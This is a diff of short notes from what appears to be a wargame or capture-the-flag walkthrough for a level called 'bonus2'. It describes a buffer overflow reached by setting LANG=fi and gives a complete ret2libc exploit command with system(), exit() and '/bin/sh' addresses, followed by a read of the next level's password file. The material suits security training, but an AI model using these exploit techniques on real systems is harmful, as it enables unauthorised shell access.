@@ -1,2 +1,10 @@
+program does getenv("LANG")
+then check if its "fi", "ln"
+if we try to overflow with our two params we can see that just two bytes can overflow with LANG=en
+but with :
 export LANG=fi
+we can overflow on eip
+with a pattern we see that the index is 18
+so we write the adresses of system(), exit() and "/bin/sh"
 ./bonus2 `python -c 'print("a"*100)'` `python -c 'print("b"*18 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
+cat /home/user/bonus3/.pass
